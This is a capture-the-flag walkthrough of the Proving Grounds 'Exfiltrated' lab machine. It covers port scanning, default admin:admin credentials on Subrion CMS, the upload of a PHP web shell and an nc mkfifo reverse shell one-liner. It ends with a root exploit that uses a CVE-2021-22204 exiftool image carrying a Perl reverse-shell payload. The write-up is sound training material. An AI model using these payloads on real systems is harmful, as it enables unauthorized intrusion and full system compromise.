---
layout: default
title: Exfiltrated
parent: Proving Grounds Practice - Linux
nav_order: 6
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/exfiltrated]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.232.163
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-24 21:57 EST
Nmap scan report for 192.168.232.163
Host is up (0.087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
| http-robots.txt: 7 disallowed entries
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/
|_/updates/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

---

## 80 | HTTP

Page is redirected to _exfiltrated.offsec_ so adding to the _/etc/hosts_ file.

![index](../../../assets/images/ctfs/proving_grounds/exfiltrated/index.png)

Gobuster results:

```bash
/0                    (Status: 200) [Size: 21687]
/index.php            (Status: 200) [Size: 21692]
/.htaccess            (Status: 403) [Size: 283]
/.htaccess.php        (Status: 403) [Size: 283]
/.htaccess.aspx       (Status: 403) [Size: 283]
/.htaccess.txt        (Status: 403) [Size: 283]
/.htaccess.conf       (Status: 403) [Size: 283]
/.htpasswd            (Status: 403) [Size: 283]
/.htpasswd.aspx       (Status: 403) [Size: 283]
/.htpasswd.php        (Status: 403) [Size: 283]
/.htpasswd.txt        (Status: 403) [Size: 283]
/.htpasswd.conf       (Status: 403) [Size: 283]
/redirect.txt         (Status: 200) [Size: 1048]
/redirect.php         (Status: 200) [Size: 1048]
/redirect.aspx        (Status: 200) [Size: 1048]
/redirect.conf        (Status: 200) [Size: 1048]
/updates              (Status: 403) [Size: 283]
/license.txt          (Status: 200) [Size: 35147]
/logout.php           (Status: 302) [Size: 0] [--> http://exfiltrated.offsec/]
/logout.txt           (Status: 302) [Size: 0] [--> http://exfiltrated.offsec/]
/logout.aspx          (Status: 302) [Size: 0] [--> http://exfiltrated.offsec/]
/logout.conf          (Status: 302) [Size: 0] [--> http://exfiltrated.offsec/]
/changelog.txt        (Status: 200) [Size: 49250]
/robots.txt           (Status: 200) [Size: 142]
/'                    (Status: 200) [Size: 21687]
/cron.php             (Status: 200) [Size: 43]
/cron.txt             (Status: 200) [Size: 43]
/cron.aspx            (Status: 200) [Size: 43]
/cron.conf            (Status: 200) [Size: 43]
/actions.conf         (Status: 200) [Size: 0]
/actions.php          (Status: 200) [Size: 0]
/actions.aspx         (Status: 200) [Size: 0]
/actions.txt          (Status: 200) [Size: 0]
/panel.aspx           (Status: 200) [Size: 6155]
/panel.txt            (Status: 200) [Size: 6155]
/panel.php            (Status: 200) [Size: 6155]
/panel.conf           (Status: 200) [Size: 6155]
```

From _robots.txt_

```bash
User-agent: *
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```

Curl shows _Subrion CMS_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/exfiltrated]
└─$ curl -v  http://exfiltrated.offsec
*   Trying 192.168.232.163:80...
* Connected to exfiltrated.offsec (192.168.232.163) port 80 (#0)
> GET / HTTP/1.1
> Host: exfiltrated.offsec
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Sat, 25 Nov 2023 03:08:14 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: INTELLI_06c8042c3d=9adinmhptuvk7ncunmo1cat01d; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Set-Cookie: INTELLI_06c8042c3d=9adinmhptuvk7ncunmo1cat01d; expires=Sat, 25-Nov-2023 03:38:14 GMT; Max-
Age=1800; path=/
< X-Powered-CMS: Subrion CMS
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html;charset=UTF-8
```

The _/panel_ directory shows the Subrion Admin Panel login and that this is version _4.2.1_

![admin](../../../assets/images/ctfs/proving_grounds/exfiltrated/admin.png)

Searchsploit shows an arbitray file upload exploit for this version if we can get authentication to the admin panel.

Default credentials _admin:admin_ allow access.

![panel](../../../assets/images/ctfs/proving_grounds/exfiltrated/panel.png)

The arbitrary file upload looks like it is simply uploading a php web shell to the _/panel/uploads_ area.

The exploit shows the extension of the file is _.phar_

Let's try a PHP web shell upload.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/exfiltrated]
└─$ cat cmd.phar
<?php
system($_GET['cmd']);
?>
```

![upload](../../../assets/images/ctfs/proving_grounds/exfiltrated/upload.png)

Verify that we have command execution with our PHP web shell.

![id](../../../assets/images/ctfs/proving_grounds/exfiltrated/id.png)

# Exploitation

---

We can now use our PHP web shell to get a reverse shell on our target.

Generate a nc-mknod reverseh shell one-liner and execute the payload to get the reverse shell.

```bash

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

# URL encode and execute the following payload

http://exfiltrated.offsec/uploads/cmd.phar?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.45.217%209001%20%3E%2Ftmp%2Ff

# Receive the reverse shell
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/exfiltrated]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.232.163] 36150
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


```

# Post-Exploitation

---

- [ ] Upgrade to TTY Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty size
stty raw -echo
fg
stty rows <first_value>
stty cols <second_value>
export TERM=xterm-256color
```

- [ ] sudo -l
- [ ] enumerate users
- [ ] SUID/GUID

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

- [ ] enumerate process running with root privileges

```bash
ps -aux | grep -i 'root'
```

- [ ] enumerate network services

```bash
netstat -antup (ss -tunlp)
```

- [ ] check for extended capabilities

```bash
getcap -r / 2>/dev/null
```

- [ ] test discovered credentials against all users
- [ ] attempt hydra ssh password crack for discovered users
- [ ] check _/opt_, _/tmp_, _/var/tmp_, _/etc_, and _/dev/shm_
- [ ] Check if /etc/passwd is writeable

## Check files in /opt

Locate a file named _image-exif.sh_ in _/opt_ that is owned by root, but world readable and executable.

```bash
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -la /opt
ls -la /opt
total 16
drwxr-xr-x  3 root root 4096 Jun 10  2021 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
-rwxr-xr-x  1 root root  437 Jun 10  2021 image-exif.sh
drwxr-xr-x  2 root root 4096 Jun 10  2021 metadata
www-data@exfiltrated:/var/www/html/subrion/uploads$ cd /opt
cd /opt
www-data@exfiltrated:/opt$ cat im
cat image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename;
do
    exiftool "$IMAGES/$filename" >> $LOGFILE
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

I placed a test _.jpg_ in the _/var/www/html/subrion/uploads_ directory and a cron job executed _image-exif.sh_ and placed the file in the metadata folder.

We should be able to get the file in _/var/www/html/subrion/uploads_ to execute if we name it with a _.jpg_ extension.

This will require creating a malicious .jpg file using an _exiftool_ that creates reverse shells embedded in _.jpg_ files.

Using the exploit at the following Github repo:

[Exiftool Exploit Github Repo](https://raw.githubusercontent.com/UNICORDev/exploit-CVE-2021-22204/main/exploit-CVE-2021-22204.py)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/exfiltrated]
└─$ python3 exploit.py -s 192.168.45.217 9002

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....

UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(9002,inet_aton('192.168.45.217')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
DEPENDS: Dependencies for exploit are met!
PREPARE: Payload written to file!
PREPARE: Payload file compressed!
PREPARE: DjVu file created!
PREPARE: JPEG image created/processed!
PREPARE: Exiftool config written to file!
EXPLOIT: Payload injected into image!
CLEANUP: Old file artifacts deleted!
SUCCESS: Exploit image written to "image.jpg"
```

Start netcat listener, upload the image.jpg file to the Subrion _/uploads_ folder, and wait for reverse shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/exfiltrated]
└─$ nc -nlvp 9002
listening on [any] 9002 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.232.163] 48238
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

```
